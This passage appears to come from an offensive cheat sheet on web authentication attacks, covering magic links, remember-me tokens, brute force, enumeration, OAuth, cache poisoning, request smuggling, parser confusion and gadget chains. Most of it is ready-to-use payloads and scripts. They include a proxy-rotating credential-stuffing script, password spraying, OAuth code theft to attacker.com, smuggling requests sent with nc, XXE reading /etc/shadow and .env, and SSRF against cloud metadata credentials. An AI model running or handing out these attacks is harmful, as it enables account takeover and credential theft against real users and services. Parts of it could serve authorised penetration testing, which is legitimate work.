Host: target.com
Content-Type: application/x-www-form-urlencoded

username=victim&email=victim@target.com

# Capture response cookie: session=PUZZLE_123

# Step 2:
GET /profile HTTP/1.1
Host: target.com
Cookie: session=PUZZLE_123

# If profile returns victim's data -> VULNERABLE

# Test payload for newsletter -> account access
# Step 1:
POST /newsletter/subscribe HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"admin@target.com"}

# Capture response cookie

# Step 2:
GET /account/settings HTTP/1.1
Host: target.com
Cookie: session=CAPTURED_COOKIE

# If returns admin settings -> VULNERABLE
```

---

## 9. Magic Link Abuse

### 9.1 Magic Link Authentication Flow

```
+----------+         +----------+         +----------+         +----------+
|  Client  |--(1)--->|  Server  |--(2)--->|  Email   |         |          |
|          | Request |          | Send    | Provider |         |          |
|          | Magic   |          | Magic   |          |         |          |
|          | Link    |          | Link    |          |         |          |
|          |<-(5)-----|<-(4)-----|<-(3)-----|          |         |          |
|          | Auth'd  | Validate| User    |          |         |          |
|          |         | Token   | Clicks  |          |         |          |
+----------+         +----------+         +----------+         +----------+
```

### 9.2 Magic Link Abuse Techniques

```
# Technique 1: Link interception
# If email is compromised, attacker clicks link first
# No additional verification (no password, no MFA)

# Technique 2: Link prediction
# Weak token generation:
# token = md5(email + timestamp)
# token = base64(email + secret)
# token = sequential number

# Technique 3: Link replay
# Magic link not invalidated after use
# Same link works multiple times
# Link works even after logout

# Technique 4: Cross-device link abuse
# Link clicked on different device than login initiated
# No device binding or verification

# Technique 5: Email scanner abuse
# Email security scanners click all links
# Scanner triggers authentication
# Attacker captures session from scanner logs

# Technique 6: Referer leakage
# Magic link redirects to app
# Referer header contains magic link with token
# Third-party analytics sees token

# Technique 7: Browser prefetching
# Browser prefetches magic link
# Link consumed before user clicks
# User gets "link expired" error
```

### 9.3 Magic Link Security Testing

```
# Test 1: Token entropy
# Analyze token length, character set, randomness
# Use Burp Sequencer on captured tokens

# Test 2: Token expiration
# Use expired link (1 hour, 1 day, 1 week old)
# Check if server properly rejects expired tokens

# Test 3: Token reuse
# Use same magic link twice
# Check if server invalidates after first use

# Test 4: Token binding
# Use magic link from different IP
# Use magic link from different User-Agent
# Check if server validates binding

# Test 5: Email change bypass
# Request magic link for victim
# Change email to attacker's email
# Click link -> logged in as victim

# Test 6: Host header poisoning
POST /request-magic-link HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
# Link sent to attacker's domain
```

---

## 10. Remember-Me Token Abuse

### 10.1 Remember-Me Token Mechanics

```
# Remember-me tokens are typically:
# 1. Long-lived cookies (30 days, 90 days, 1 year)
# 2. Stored in database with user association
# 3. Hashed or encrypted before storage
# 4. Regenerated on each use (rotation)

# Common implementation:
Set-Cookie: remember-me=base64(username:timestamp:signature)
# Or:
Set-Cookie: remember-me=random_token
# Server stores: token_hash -> user_id, expiration
```

### 10.2 Remember-Me Token Vulnerabilities

```
# Vulnerability 1: Token not hashed in database
# Database breach -> steal all remember-me tokens
# Attacker can impersonate any user

# Vulnerability 2: Token not rotated after use
# Same token valid indefinitely
# Stolen token works forever

# Vulnerability 3: Token predictable
# token = md5(username + salt)
# token = base64(user_id + timestamp)

# Vulnerability 4: Token not bound to device
# Stolen token works from any device/IP
# No fingerprinting or validation

# Vulnerability 5: Token not invalidated on password change
# User changes password after breach
# Remember-me token still valid

# Vulnerability 6: Token not invalidated on logout
# User clicks "logout"
# Remember-me token still valid
# Next visit -> automatically logged in

# Vulnerability 7: Cross-site token leakage
# XSS steals remember-me cookie
# HttpOnly flag missing
# JavaScript can read document.cookie
```

### 10.3 Remember-Me Token Exploitation

```python
# Exploitation scenario: Database breach
# Attacker has read access to remember_me_tokens table

# Step 1: Extract tokens from database
SELECT user_id, token_hash, expires FROM remember_me_tokens;

# Step 2: If tokens are hashed but weak:
# Use rainbow tables or brute force
# md5(token) is fast to crack

# Step 3: Construct cookie
# If token is stored as plaintext in cookie:
cookie = f"remember-me={token_value}"

# Step 4: Send request with stolen token
requests.get("https://target.com/dashboard", 
             headers={"Cookie": cookie})

# Step 5: Account takeover achieved
```

### 10.4 Remember-Me Token Security Testing

```
# Test 1: Token rotation
# Login with remember-me
# Capture token cookie
# Visit site again -> check if token changed
# If same token -> VULNERABLE (no rotation)

# Test 2: Token invalidation on logout
# Login with remember-me
# Logout
# Send request with old remember-me token
# If still authenticated -> VULNERABLE

# Test 3: Token invalidation on password change
# Login with remember-me
# Change password
# Send request with old remember-me token
# If still authenticated -> VULNERABLE

# Test 4: Token fingerprinting
# Login with remember-me on Device A
# Use token on Device B (different IP, UA)
# If still authenticated -> VULNERABLE (no binding)

# Test 5: Token entropy
# Capture multiple remember-me tokens
# Analyze with Burp Sequencer
# Low entropy -> predictable tokens
```


---

## 11. Brute-Force Bypass Techniques

### 11.1 Rate Limit Bypass Techniques

```
# Technique 1: IP rotation
# Use proxy pools, VPNs, Tor
# Each request from different IP
# Bypasses IP-based rate limiting

# Technique 2: Distributed attacks
# Multiple attackers coordinate
# Each attacks different account subset
# Bypasses per-account rate limiting

# Technique 3: Credential stuffing optimization
# Use breached credentials
# Low and slow approach
# Evades detection thresholds

# Technique 4: CAPTCHA bypass
# Use CAPTCHA solving services
# 2captcha, Anti-Captcha, etc.
# Machine learning-based solvers

# Technique 5: Session rotation
# Create new session for each attempt
# Bypasses session-based rate limiting

# Technique 6: Header manipulation
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 1.1.1.2
# etc.
# Bypasses IP extraction from headers

# Technique 7: Account lockout bypass
# Distributed attack (one attempt per account per IP)
# Lockout reset timing exploitation
# Multiple accounts to avoid per-account lockout
```

### 11.2 Brute Force Payloads

```python
# Python script for distributed brute force
import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor

# Proxy pool for IP rotation
proxies = [
    "http://user:pass@proxy1:8080",
    "http://user:pass@proxy2:8080",
    # ... more proxies
]

def attempt_login(username, password, proxy):
    headers = {
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    data = {
        'username': username,
        'password': password
    }

    try:
        response = requests.post(
            'https://target.com/login',
            data=data,
            headers=headers,
            proxies={'http': proxy, 'https': proxy},
            timeout=10
        )

        if 'dashboard' in response.url or response.status_code == 302:
            print(f"[+] Success: {username}:{password}")
            return True
    except:
        pass

    return False

# Credential stuffing with breached data
with open('breached_credentials.txt') as f:
    credentials = [line.strip().split(':') for line in f]

with ThreadPoolExecutor(max_workers=50) as executor:
    for username, password in credentials:
        proxy = random.choice(proxies)
        executor.submit(attempt_login, username, password, proxy)
```

### 11.3 Password Spraying

```
# Password spraying: one password against many accounts
# Evades per-account lockout by distributing attempts

# Common passwords to spray:
Password1
Welcome1
Spring2026!
Summer2026!
CompanyName123!
Qwerty123!
Letmein123!
Admin123!

# Spray methodology:
# 1. Enumerate usernames (see Section 12)
# 2. Choose 1-3 common passwords
# 3. Test each password against all usernames
# 4. Wait 1-4 hours (lockout reset period)
# 5. Repeat with next password

# Spray script:
for password in passwords:
    for username in usernames:
        attempt_login(username, password)
        sleep(random.uniform(1, 5))  # Random delay
    sleep(3600)  # Wait 1 hour between rounds
```

### 11.4 Brute Force Protection Bypass

```
# Bypass technique: Timing analysis
# If lockout is 5 attempts, test 4, wait, test 4
# If lockout is time-based, wait for reset

# Bypass technique: Multiple endpoints
# /login has rate limiting
# /api/login has no rate limiting
# /mobile/login has weaker protection
# /admin/login has different thresholds

# Bypass technique: Case variation
# Username case sensitivity
# admin != ADMIN != Admin
# Some systems treat them as different accounts

# Bypass technique: Encoding variation
# username=admin
# username=%61dmin
# username=admin%00
# username=admin%20
# Some systems normalize differently
```

---

## 12. Username Enumeration Payloads

### 12.1 Error Message Enumeration

```
# Different error messages for invalid username vs invalid password

# Valid username, invalid password:
"Invalid password for user admin"
"Password incorrect"

# Invalid username:
"User not found"
"Invalid username"
"Account does not exist"

# Test methodology:
# 1. Test with known valid username + wrong password
#    -> Capture exact error message
# 2. Test with known invalid username + wrong password
#    -> Capture exact error message
# 3. Compare messages
# 4. If different -> enumeration possible

# Automation with ffuf:
ffuf -w usernames.txt -u https://target.com/login   -X POST -d "username=FUZZ&password=wrong"   -H "Content-Type: application/x-www-form-urlencoded"   -fr "Invalid username"  # Filter out invalid
```

### 12.2 Response Timing Enumeration

```python
# Username enumeration via response timing
# Valid username + long password = longer processing time
# Invalid username = immediate rejection

import requests
import time
from threading import Thread

def test_username(url, username):
    # Use very long password to exaggerate timing difference
    long_password = "A" * 10000

    data = {
        'username': username,
        'password': long_password
    }

    start = time.time()
    response = requests.post(url, data=data)
    elapsed = time.time() - start

    return elapsed

# Baseline: invalid username
invalid_time = test_username(url, "nonexistent_user_12345")

# Test list
with open('usernames.txt') as f:
    for username in f:
        username = username.strip()
        elapsed = test_username(url, username)

        # If significantly longer than baseline -> valid username
        if elapsed > invalid_time * 2:
            print(f"[+] Valid username: {username} ({elapsed:.2f}s)")
```

### 12.3 Response Timing with Burp (PortSwigger Lab)

```
# PortSwigger Lab: Username enumeration via response timing
# Technique: Use very long password to exaggerate hash computation time

# Step 1: Find invalid username response time
# username=invalid, password=short -> ~300ms

# Step 2: Find valid username response time
# username=valid, password=short -> ~300ms (same, hard to distinguish)

# Step 3: Use very long password
# username=invalid, password=10000chars -> ~600ms
# username=valid, password=10000chars -> ~2500ms (hash computation)

# Step 4: Use X-Forwarded-For to bypass IP-based brute force protection
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 1.1.1.2
# etc.

# Step 5: Automate with Python script
# See Section 11.2 for script template
```

### 12.4 Status Code Enumeration

```
# Different status codes for valid vs invalid usernames

# Valid username:
HTTP/1.1 200 OK
{"status":"error","message":"Invalid password"}

# Invalid username:
HTTP/1.1 404 Not Found
{"status":"error","message":"User not found"}

# Or:
# Valid: HTTP/1.1 403 Forbidden
# Invalid: HTTP/1.1 401 Unauthorized
```

### 12.5 Account Lockout Enumeration

```
# Account lockout reveals valid usernames
# After 5 failed attempts:
# Valid username: "Account locked for 30 minutes"
# Invalid username: "Invalid username or password"

# Test:
for username in usernames:
    for i in range(6):
        response = attempt_login(username, "wrong_password")
        if "locked" in response.text:
            print(f"[+] Valid username (locked): {username}")
            break
```

### 12.6 Password Reset Enumeration

```
# Password reset reveals valid emails/usernames

# Valid email:
"Password reset link sent to your email"
HTTP/1.1 200 OK

# Invalid email:
"Email not found"
HTTP/1.1 404 Not Found
# Or: "If this email exists, a reset link was sent"
# (Secure response - same for both)

# Test:
POST /forgot-password
email=test@example.com

# Response analysis:
# If response time differs -> enumeration possible
# If response content differs -> enumeration possible
```

### 12.7 Registration Enumeration

```
# Registration reveals existing usernames/emails

# Existing username:
"Username already taken"
"Email already registered"

# Available username:
"Registration successful"
"Check your email for verification"

# Test:
POST /register
username=test&email=test@example.com

# If "already taken" -> valid username exists
```

### 12.8 Profile/Endpoint Enumeration

```
# Profile endpoints reveal valid usernames

# Valid username:
GET /user/admin -> 200 OK (profile page)
GET /api/users/admin -> 200 OK (JSON profile)

# Invalid username:
GET /user/nonexistent -> 404 Not Found
GET /api/users/nonexistent -> 404 Not Found

# Automation:
ffuf -w usernames.txt -u https://target.com/user/FUZZ   -mc 200 -o valid_users.txt
```

---

## 13. OAuth + Authentication Chains

### 13.1 OAuth 2.0 Attack Vectors

```
# Attack Vector 1: Redirect URI manipulation
# Authorization request:
GET /oauth/authorize?client_id=app&redirect_uri=https://attacker.com/callback&response_type=code&scope=profile

# If server doesn't validate redirect_uri:
# Attacker gets authorization code

# Attack Vector 2: Authorization code interception
# Code sent to redirect_uri
# If redirect_uri is HTTP (not HTTPS) -> MITM
# If code is in URL fragment -> leaked via Referer

# Attack Vector 3: CSRF on authorization
# No state parameter
# Attacker tricks user into authorizing malicious app

# Attack Vector 4: Token leakage
# Access token in URL query parameter
# Access token in browser history
# Access token logged by proxy/server

# Attack Vector 5: Scope escalation
# Request additional scopes
# If server doesn't validate: scope=profile+email+admin

# Attack Vector 6: Client impersonation
# Use legitimate client_id with attacker's redirect_uri
# If client registration is open -> register malicious app
```

### 13.2 OAuth Hidden Attack Vectors (PortSwigger Research)

```
# Hidden Vector 1: OpenID Connect nonce bypass
# Missing nonce -> replay attacks
# Predictable nonce -> token forgery

# Hidden Vector 2: ID token confusion
# Accept ID token as access token
# ID token contains claims but no access validation

# Hidden Vector 3: JWT algorithm confusion in ID tokens
# alg: none accepted
# alg: HS256 with public key as secret

# Hidden Vector 4: Hybrid flow abuse
# code + token response
# Token returned in URL -> leakage

# Hidden Vector 5: Dynamic client registration abuse
# Register client with attacker redirect_uri
# If dynamic registration is open -> full OAuth abuse

# Hidden Vector 6: PKCE downgrade
# code_challenge missing
# Server falls back to non-PKCE flow
# Authorization code interception possible
```

### 13.3 OAuth to Account Takeover Chains

```
# Chain 1: OAuth + Email verification bypass
# 1. Attacker creates account with victim's email (unverified)
# 2. Attacker initiates OAuth login
# 3. OAuth provider returns verified email
# 4. Application trusts OAuth email -> account linked
# 5. Attacker now owns victim's account

# Chain 2: OAuth + Session fixation
# 1. Attacker gets pre-auth session
# 2. Attacker initiates OAuth flow with fixed session
# 3. Victim completes OAuth authorization
# 4. Attacker uses same session -> logged in as victim

# Chain 3: OAuth + Redirect URI open redirect
# 1. Attacker finds open redirect on target.com
# 2. redirect_uri=https://target.com/redirect?url=https://attacker.com
# 3. Server validates redirect_uri as belonging to target.com
# 4. Code sent to target.com/redirect -> redirected to attacker.com
# 5. Attacker captures code

# Chain 4: OAuth + SSRF via redirect_uri
# 1. redirect_uri=https://internal.target.com/oauth/callback
# 2. Server sends authorization code to internal service
# 3. If internal service is vulnerable -> SSRF
```

### 13.4 OAuth Payloads

```
# Authorization endpoint manipulation
GET /oauth/authorize?client_id=legitimate_app&redirect_uri=https://attacker.com/callback&response_type=code&scope=profile+email+admin&state=ATTACKER_STATE

# Token endpoint manipulation
POST /oauth/token
grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://attacker.com/callback&client_id=legitimate_app&client_secret=STOLEN_SECRET

# Implicit flow token theft
# Token in URL fragment: https://target.com/callback#access_token=TOKEN
# JavaScript reads fragment: var token = window.location.hash.split('=')[1]

# ID token manipulation
# Decode ID token JWT
# Modify claims (email, role, sub)
# Re-sign with weak secret or alg:none
```

### 13.5 OAuth Reconnaissance

```bash
# Discover OAuth endpoints
# Check well-known OpenID Connect configuration

curl https://target.com/.well-known/openid-configuration

# Look for:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri (JSON Web Key Set)
# - scopes_supported
# - response_types_supported
# - grant_types_supported

# Discover OAuth clients
curl https://target.com/oauth/clients
# Or: /api/clients, /admin/clients, /oauth2/clients

# Check for dynamic client registration
POST /oauth/register
{
  "client_name": "attacker_app",
  "redirect_uris": ["https://attacker.com/callback"],
  "grant_types": ["authorization_code"]
}
```

---

## 14. Cache Poisoning + Authentication Chains

### 14.1 Web Cache Entanglement (PortSwigger Research)

```
# Cache entanglement: Cache uses one key for multiple resources
# Poison cache with unauthenticated response -> serve to authenticated users

# Attack flow:
# 1. Attacker requests /profile with malicious header
#    GET /profile HTTP/1.1
#    Host: target.com
#    X-Cache-Poison: attacker_controlled
#
# 2. Cache stores response with key: /profile + X-Cache-Poison
#    But cache key doesn't include Cookie or Authorization!
#
# 3. Victim requests /profile with valid session
#    Cache returns attacker's poisoned response
#    -> Victim sees attacker's profile or XSS payload
```

### 14.2 Cache Poisoning + Authentication Bypass

```
# Scenario 1: Cache key excludes auth headers
# Cache key: Host + Path + Query
# Missing: Cookie, Authorization, X-API-Key

# Attack:
# 1. Attacker requests /admin with no auth
#    -> 401 Unauthorized
# 2. Attacker adds header that changes cache key behavior
#    X-Original-URL: /admin
#    -> Cache stores 401 with key including X-Original-URL
# 3. Victim requests /admin with valid auth
#    -> Cache returns 401 (wrong!)
#    -> OR: Attacker poisons with 200 + malicious content

# Scenario 2: Cache poisoning with reflected XSS
# 1. Attacker requests /search?q=<script>...
#    -> Response contains reflected XSS
# 2. Cache stores this response
# 3. Victim visits /search?q=<script>...
#    -> XSS executes in victim's authenticated session
#    -> Attacker steals session cookie
```

### 14.3 Cache Deception + Authentication

```
# Cache deception: Trick cache into storing private data
# Then access it as unauthenticated user

# Attack:
# 1. Attacker requests /profile.jpg (non-existent)
#    But server responds with /profile content (path normalization)
#    Cache stores /profile content at /profile.jpg key
# 2. Attacker requests /profile.jpg (no auth needed for .jpg?)
#    -> Gets victim's profile data from cache

# Or:
# 1. Attacker requests /api/user.json
#    -> Returns JSON with user data
#    Cache stores it
# 2. Attacker requests /api/user.json (no auth)
#    -> Gets cached user data
```

### 14.4 Cache Poisoning Payloads

```http
# Poison cache with unauthenticated response
GET /dashboard HTTP/1.1
Host: target.com
X-HTTP-Method-Override: POST
X-Original-Method: GET

# If cache uses method in key but server ignores override:
# Cache key: GET /dashboard
# Server processes as POST (which might bypass auth check)

# Poison via query parameter
GET /profile?cb=attacker_controlled HTTP/1.1
Host: target.com

# If cache includes cb in key:
# Attacker poisons specific cb value
# Victim with same cb gets poisoned response

# Poison via Accept header
GET /api/user HTTP/1.1
Host: target.com
Accept: application/json

# If cache key includes Accept:
# Attacker poisons with Accept: text/html
# Server returns HTML instead of JSON
# Victim requesting JSON gets HTML (XSS possible)
```

### 14.5 Cache Key Analysis

```bash
# Determine cache key components
# Send two requests with one difference, check if cache hit

# Test 1: Does cache key include Cookie?
curl -I https://target.com/profile -b "session=abc"
curl -I https://target.com/profile -b "session=xyz"
# If X-Cache: HIT for both -> Cookie NOT in cache key

# Test 2: Does cache key include Authorization?
curl -I https://target.com/api -H "Authorization: Bearer abc"
curl -I https://target.com/api -H "Authorization: Bearer xyz"
# If X-Cache: HIT -> Authorization NOT in cache key

# Test 3: Does cache key include query parameters?
curl -I https://target.com/search?q=abc
curl -I https://target.com/search?q=xyz
# If X-Cache: HIT for second -> query NOT in key (unlikely)
# If MISS -> query IS in key

# Test 4: Does cache key include Host header?
curl -I https://target.com/page -H "Host: target.com"
curl -I https://target.com/page -H "Host: evil.com"
# If both HIT -> Host NOT in key (very dangerous!)
```

---

## 15. Request Smuggling + Authentication Chains

### 15.1 HTTP Request Smuggling Basics

```
# Request smuggling exploits inconsistent parsing of request boundaries
# between front-end (proxy/WAF) and back-end (application server)

# Classic CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

SMUGGLED

# Front-end uses Content-Length: 6 -> sends "0\r\n\r\n"
# Back-end uses Transfer-Encoding: chunked -> sees "0" (end of chunks)
# Then "\r\nSMUGGLED" -> treated as new request
```

### 15.2 Request Smuggling + Authentication Bypass

```
# Scenario 1: Smuggle past WAF authentication check
# WAF checks auth on first request, but smuggled request bypasses WAF

# Front-end (WAF):
# Request 1: POST /login (checked by WAF)
# Request 2: GET /admin (smuggled, NOT checked by WAF)

POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION

# Back-end receives:
# Request 1: POST / (from front-end)
# Request 2: GET /admin (smuggled, with attacker's session)

# Scenario 2: Smuggle to bypass IP-based auth
# Internal endpoints only accessible from 127.0.0.1
# Smuggle request with X-Forwarded-For: 127.0.0.1

POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1

# Scenario 3: Smuggle to poison admin session
# Smuggle request that sets session cookie for admin

POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=admin&password=admin
```

### 15.3 HTTP/2 Downgrade Smuggling

```
# HTTP/2 to HTTP/1.1 downgrade smuggling
# Front-end speaks HTTP/2, back-end speaks HTTP/1.1
# HTTP/2 pseudo-headers become HTTP/1.1 headers

# HTTP/2 request:
:method POST
:path /
:authority target.com
content-length 6
transfer-encoding chunked

0

SMUGGLED

# Downgraded to HTTP/1.1:
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

SMUGGLED

# Same CL.TE vulnerability
```

### 15.4 Browser-Powered Desync (PortSwigger Research)

```
# Browser-powered request smuggling
# Uses victim's browser to send smuggled requests

# Attack flow:
# 1. Attacker controls a website
# 2. Victim visits attacker's website
# 3. Attacker's JavaScript sends crafted request to target.com
# 4. Request causes desync in front-end/back-end
# 5. Victim's subsequent requests are "smuggled"

# Example: CRLF injection in header value
POST / HTTP/1.1
Host: target.com
Content-Length: 50

param=value

GET /admin HTTP/1.1
Host: target.com



# If server reflects param in response header:
# X-Custom-Header: value

GET /admin HTTP/1.1
Host: target.com


# -> Response splitting -> request smuggling
```

### 15.5 Request Smuggling Detection

```bash
# Detect request smuggling with timing analysis
# Send ambiguous request, measure response time

# CL.TE test:
echo -e "POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X" | nc target.com 80

# If server hangs -> likely vulnerable (back-end waiting for more chunks)

# TE.CL test:
echo -e "POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

" | nc target.com 80

# If server returns error -> likely vulnerable

# Automated detection with Burp:
# Use HTTP Request Smuggler extension (PortSwigger)
# Or: smuggler tool by defparam
```

---

## 16. Parser Confusion Payloads

### 16.1 Content-Type Parser Confusion

```
# Different parsers interpret Content-Type differently
# Server parses as JSON, but auth middleware parses as XML

# Request:
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"admin"}

# But if server also accepts:
Content-Type: application/xml
<?xml version="1.0"?>
<login>
  <username>admin</username>
  <password>admin</password>
</login>

# Confusion attack:
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json; charset=utf-8

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
  <username>&xxe;</username>
  <password>admin</password>
</login>

# If XML parser is invoked despite JSON Content-Type -> XXE
```

### 16.2 Parameter Parser Confusion

```
# Same parameter parsed differently by different components

# Example: PHP parses array notation, but auth library doesn't
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&username[]=attacker
password=admin

# PHP: $_POST['username'] = ['admin', 'attacker']
# Auth library: username = 'admin' (first occurrence)
# But validation library: username = 'attacker' (last occurrence)

# Or:
username=admin&username[role]=admin
# PHP: $_POST['username'] = ['admin', 'role' => 'admin']
# Auth library might use 'role' for authorization
```

### 16.3 JSON Parser Confusion

```json
// Different JSON parsers handle edge cases differently

// Duplicate keys:
{"username": "admin", "username": "attacker"}
// Parser A: uses first value (admin)
// Parser B: uses last value (attacker)

// Type confusion:
{"is_admin": false}
{"is_admin": "false"}
{"is_admin": 0}
{"is_admin": null}
{"is_admin": []}
// Weakly typed language might treat "false" as true

// Unicode confusion:
{"username": "\u0061dmin"}  // \u0061 = 'a'
// Normalization might convert to "admin"

// Comment injection (JSON5):
{"username": "admin", /* "role": "user" */ "role": "admin"}
// Some parsers support comments, others don't
```

### 16.4 URL Parser Confusion

```
# Different URL parsers extract different host/path values

# Example: @ in URL path vs userinfo
http://target.com@attacker.com/path
# Some parsers: host = target.com, path = @attacker.com/path
# Other parsers: host = attacker.com, path = /path

# Unicode domain confusion:
https://tаrget.com  (Cyrillic а instead of Latin a)
# Punycode: https://xn--trget-5cd.com
# Some parsers show punycode, others show Unicode

# Path normalization confusion:
/admin/../admin
/admin/./dashboard
/admin//dashboard
/admin/dashboard/
// Different normalization rules

# Query parameter confusion:
?user=admin&user=attacker
// First occurrence vs last occurrence
// Array vs string
```

### 16.5 Header Parser Confusion

```
# Multiple headers with same name
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 1.2.3.4
// Some frameworks: first value
// Others: last value
// Others: comma-separated list

# Header value encoding:
X-Custom: value%0d%0aInjected-Header: evil
// Some parsers: URL decode
// Others: literal value

# Whitespace confusion:
X-Custom: value
Injected-Header: evil
X-Custom: value
Injected-Header: evil
X-Custom: valueInjected-Header: evil
// Different line ending handling

# Case sensitivity:
content-type vs Content-Type vs CONTENT-TYPE
// Some systems: case-insensitive
// Others: case-sensitive
```

---

## 17. Browser Quirks

### 17.1 Same-Origin Policy (SOP) Edge Cases

```
# SOP is based on scheme + host + port
# Edge cases where SOP is relaxed:

# 1. document.domain
# Both pages set document.domain = "example.com"
# Then they can interact despite different subdomains

# 2. CORS misconfiguration
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# -> Attacker can read authenticated responses

# 3. postMessage without origin check
# window.postMessage(data, "*")
# -> Any origin can receive message

# 4. JSONP endpoints
# /api/user?callback=attackerFunction
# -> Executes attacker function with data

# 5. CORS preflight caching
# Preflight response cached for 24 hours
# If CORS policy changes, old policy still cached
```

### 17.2 Cookie Handling Quirks

```
# Cookie scope quirks:
# Domain=example.com -> sent to example.com AND subdomains
# No Domain attribute -> sent only to exact host
# Path=/admin -> sent to /admin AND subpaths

# Cookie precedence:
# More specific path wins over less specific
# /admin cookie wins over / cookie for /admin requests

# Cookie jar overflow:
# Browsers limit cookies per domain (Chrome: ~180)
# If attacker sets many cookies, legitimate cookies evicted
# -> Session cookie lost -> user logged out

# Cookie tossing:
# Attacker on subdomain sets cookie for parent domain
# Overwrites legitimate cookie
# Example: evil.example.com sets cookie for Domain=.example.com
```

### 17.3 HTTP Authentication Quirks

```
# Basic auth credentials in URL (deprecated):
https://username:password@example.com/admin
# Modern browsers strip credentials before sending
# But some tools/libraries still support it

# Basic auth caching:
# Browser caches credentials for realm
# Even after logout, credentials still cached
# Until browser restart or explicit credential clearing

# Digest auth nonce reuse:
# If server reuses nonces -> replay attacks possible
# If nonce is predictable -> pre-computation attacks

# Cross-origin image auth:
# Firefox 59+: cross-origin images no longer trigger auth dialogs
# Prevents credential theft via image tags
```

### 17.4 WebAuthn / FIDO2 Quirks

```
# WebAuthn origin validation:
# Relying Party ID (rpId) must be registrable domain
# If rpId is "example.com", works on all subdomains
# Attacker on evil.example.com can use credentials

# Attestation bypass:
# Some implementations don't verify attestation
# -> Fake authenticators possible

# Resident key (discoverable credential) issues:
# Stored on authenticator with username
# If authenticator is shared -> credential sharing

# Backup eligibility confusion:
# BE=0 (not backed up) vs BE=1 (backed up)
# Some systems don't check this flag
```

### 17.5 Browser Cache Quirks

```
# Back/forward cache (bfcache):
# Pages stored in memory when navigating away
# When returning, page restored from cache
# JavaScript state preserved (including sensitive data)
# Form data preserved (including passwords)

# Prefetching:
# <link rel="prefetch" href="/admin">
# Browser fetches page in background
# If auth required -> 401 response cached?
# Or: prefetch with credentials -> page cached with auth

# Prerendering:
# <link rel="prerender" href="/dashboard">
# Browser renders page in invisible tab
# JavaScript executes, including auth checks
# If auth expires -> prerendered page has stale auth state
```

---

## 18. Gadget Chains

### 18.1 Prototype Pollution -> Authentication Bypass

```javascript
// Node.js prototype pollution gadgets

// Gadget 1: Express session middleware
// Pollute Object.prototype.session = true
// -> req.session always truthy -> bypass session check

// Gadget 2: JWT verification
// Pollute Object.prototype.alg = 'none'
// -> JWT accepted with alg: none

// Gadget 3: Passport.js strategy
// Pollute Object.prototype.isAdmin = true
// -> req.user.isAdmin always true

// Gadget 4: MongoDB query
// Pollute Object.prototype.$gt = ''
// -> Query becomes {username: {$gt: ''}} -> matches all

// Exploitation:
// 1. Find prototype pollution source
//    - Merge operations (lodash, jQuery)
//    - Deep clone operations
//    - Object.assign with user input
//
// 2. Pollute prototype with auth-related property
//    __proto__.isAuthenticated = true
//    __proto__.role = 'admin'
//    __proto__.isAdmin = true
//
// 3. Access protected endpoint
//    -> Auth check passes due to polluted prototype
```

### 18.2 Deserialization -> Authentication Bypass

```java
// Java deserialization gadgets

// Gadget 1: CommonsCollections
// Transforms array -> Runtime.exec()
// Can execute commands to modify auth state

// Gadget 2: Spring Security
// RememberMeToken -> can forge tokens

// Gadget 3: Apache Shiro
// RememberMe cookie deserialization
// -> RCE or auth bypass

// PHP deserialization gadgets
// __wakeup() -> file operations
// __destruct() -> database queries
// Can modify session files or auth state

// .NET deserialization
// ObjectDataProvider -> arbitrary method invocation
// ExpandedWrapper -> type confusion
// Can invoke auth-related methods
```

### 18.3 XXE -> Authentication Bypass

```xml
<!-- XXE to read auth-related files -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/shadow">
  <!ENTITY xxe2 SYSTEM "file:///var/www/.env">
  <!ENTITY xxe3 SYSTEM "file:///proc/self/environ">
]>
<login>
  <username>&xxe;</username>
  <password>admin</password>
</login>

<!-- XXE to SSRF internal auth endpoints -->
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">

<!-- XXE to read session files -->
<!ENTITY xxe SYSTEM "file:///var/lib/php/sessions/sess_abc123">
```

### 18.4 SSRF -> Authentication Bypass

```
# SSRF to internal auth endpoints

# Internal admin panel only accessible from localhost:
POST /api/webhook HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://localhost:8080/admin/disable-2fa?user=victim"}

# Internal metadata service (cloud):
POST /api/webhook HTTP/1.1
Host: target.com

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Internal JWT signing endpoint:
POST /api/webhook HTTP/1.1
Host: target.com

{"url": "http://localhost:5000/sign?payload=admin"}
```

### 18.5 Race Condition -> Authentication Bypass

```python
# Race condition in registration
# Create two accounts with same username simultaneously

import threading
import requests

def register(username):
    requests.post("https://target.com/register", data={
        "username": username,
        "password": "password123",
        "email": f"{username}@example.com"
    })

# Race: both threads try to create "admin"
